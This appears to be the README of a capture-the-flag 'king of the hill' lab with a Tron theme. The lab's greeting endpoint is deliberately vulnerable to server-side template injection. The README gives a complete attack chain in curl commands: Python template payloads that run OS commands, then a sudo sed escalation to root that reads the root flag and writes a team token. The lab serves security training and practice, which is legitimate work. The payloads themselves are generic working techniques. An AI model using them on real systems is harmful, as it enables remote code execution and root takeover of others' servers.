# Hill 9 - Grid Portal / I/O Tower (SSTI -> RCE -> sudo sed)

*Theme: Tron / The Grid.* The program portal renders your name through a naive
template engine that evaluates `{{ ... }}` server-side - **server-side template
injection**.

- **Entry:** `GET /greet?name={{...}}` evaluates the expression. Prove it with
  `{{7*7}}`, then execute: `{{__import__('os').popen('id').read()}}`. Foothold:
  `program`. Port 80 (8089 locally).
- **Privesc:** `sudo /usr/bin/sed` (GTFOBins) reads and executes as root:
  `sudo sed -n p /root/root.txt` (read), `sudo sed -n '1e <cmd>' /etc/hostname` (exec).
  Restored on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Attack chain

    # 1. SSTI proof + user flag
    curl -s -G http://127.0.0.1:8089/greet --data-urlencode 'name={{7*7}}'
    curl -s -G http://127.0.0.1:8089/greet --data-urlencode \
      "name={{__import__('subprocess').run(['cat','/home/program/user.txt'],capture_output=True,text=True).stdout}}"

    # 2. privesc via sudo sed -> root flag
    curl -s -G http://127.0.0.1:8089/greet --data-urlencode \
      "name={{__import__('subprocess').run(['sudo','sed','-n','p','/root/root.txt'],capture_output=True,text=True).stdout}}"

    # 3. take the hill: write your token to /root/king.txt (sudo sed exec)
    curl -s -G http://127.0.0.1:8089/greet --data-urlencode \
      "name={{__import__('subprocess').run(['sudo','sed','-n','1e echo TOK-YOUR-TEAM > /root/king.txt','/etc/hostname'],capture_output=True,text=True).stdout}}"

## Run locally

    docker compose up -d --build   # app: http://localhost:8089/
